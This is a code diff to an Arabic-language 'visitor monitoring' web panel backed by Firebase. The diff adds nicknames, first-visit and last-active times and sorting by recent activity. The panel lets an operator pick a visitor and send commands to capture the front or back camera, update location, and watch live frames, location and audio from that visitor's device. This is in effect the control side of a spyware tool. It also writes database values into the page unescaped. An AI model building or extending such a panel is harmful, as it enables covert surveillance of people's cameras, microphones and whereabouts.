@@ -16,18 +16,22 @@
     .status-granted { color:#10b981; font-weight:bold; }
     .status-denied { color:#ef4444; font-weight:bold; }
     .status-pending { color:#f59e0b; font-weight:bold; }
+    .new { background:#fefce8; }
   </style>
 </head>
 <body>
 
 <div class="panel">
-  <h1>🔴 مراقبة الزوار</h1>
+  <h1>🔴 مراقبة الزوار (الحديث في الأعلى)</h1>
   <table id="visitorsTable">
     <thead>
       <tr>
+        <th>الاسم المميز</th>
         <th>معرف الزائر</th>
         <th>الجهاز</th>
         <th>الموافقة</th>
+        <th>أول زيارة</th>
+        <th>آخر نشاط</th>
         <th>الموقع</th>
       </tr>
     </thead>
@@ -36,8 +40,8 @@
 </div>
 
 <div class="panel" id="controlPanel" style="display:none;">
-  <h2>مراقبة: <span id="selectedId"></span></h2>
- 
+  <h2>مراقبة: <span id="selectedId"></span> (<span id="selectedName"></span>)</h2>
+  
   <button onclick="sendCommand('frontCamera')" style="background:#3b82f6;color:white;">📸 كاميرا أمامية</button>
   <button onclick="sendCommand('backCamera')" style="background:#ef4444;color:white;">📸 كاميرا خلفية</button>
   <button onclick="sendCommand('requestLocation')" style="background:#10b981;color:white;">📍 تحديث الموقع</button>
@@ -67,33 +71,64 @@
   const db = firebase.database();
 
   let selectedVisitor = null;
+  let visitorNames = {}; // لتخزين الأسماء المميزة
+
+  function generateVisitorName(id) {
+    const names = ["أحمد", "محمد", "علي", "عمر", "خالد", "يوسف", "مريم", "فاطمة", "نور", "سارة"];
+    const num = Math.floor(Math.random() * 999) + 1;
+    return `زائر_${names[num % names.length]}${num}`;
+  }
 
   function loadVisitors() {
     db.ref('visitors').on('value', snap => {
-      let html = '';
+      let visitorsArray = [];
+      
       snap.forEach(child => {
         const d = child.val();
+        const id = child.key;
+
+        // إنشاء اسم مميز إذا لم يكن موجود
+        if (!visitorNames[id]) {
+          visitorNames[id] = generateVisitorName(id);
+        }
+
+        const firstVisit = d.firstVisit ? new Date(d.firstVisit).toLocaleString('ar-EG') : '—';
+        const lastActive = d.lastActive ? new Date(d.lastActive).toLocaleString('ar-EG') : '—';
+
         let statusHTML = d.consentStatus === "granted" ? 
           '<span class="status-granted">✅ موافق</span>' : 
           d.consentStatus === "denied" ? 
           '<span class="status-denied">❌ رفض</span>' : 
           '<span class="status-pending">⏳ في انتظار</span>';
 
-        html += `<tr onclick="selectVisitor('${child.key}')">
-          <td>${child.key}</td>
-          <td>${d.device || '-'}</td>
-          <td>${statusHTML}</td>
-          <td>${d.location ? '✅' : '❌'}</td>
-        </tr>`;
+        visitorsArray.push({
+          html: `<tr onclick="selectVisitor('${id}')">
+            <td><strong>${visitorNames[id]}</strong></td>
+            <td>${id}</td>
+            <td>${d.device || '-'}</td>
+            <td>${statusHTML}</td>
+            <td>${firstVisit}</td>
+            <td>${lastActive}</td>
+            <td>${d.location ? '✅' : '❌'}</td>
+          </tr>`,
+          lastActive: d.lastActive || 0
+        });
       });
-      document.querySelector('#visitorsTable tbody').innerHTML = html || '<tr><td colspan="4">لا يوجد زوار حالياً</td></tr>';
+
+      // ترتيب من الأحدث إلى الأقدم
+      visitorsArray.sort((a, b) => b.lastActive - a.lastActive);
+
+      let html = visitorsArray.map(item => item.html).join('');
+      document.querySelector('#visitorsTable tbody').innerHTML = html || '<tr><td colspan="7">لا يوجد زوار حالياً</td></tr>';
     });
   }
 
   function selectVisitor(id) {
     selectedVisitor = id;
     document.getElementById('selectedId').textContent = id;
+    document.getElementById('selectedName').textContent = visitorNames[id] || 'غير معروف';
     document.getElementById('controlPanel').style.display = 'block';
+
     watchLiveFrame(id);
     watchLocation(id);
     watchLiveAudio(id);
@@ -131,7 +166,13 @@
     });
   }
 
-  // تشغيل تلقائي بدون كلمة سر
+  // تحديث آخر نشاط كل 10 ثواني
+  setInterval(() => {
+    if (selectedVisitor) {
+      db.ref('visitors/' + selectedVisitor).update({ lastActive: Date.now() });
+    }
+  }, 10000);
+
   window.onload = loadVisitors;
 </script>
 </body>
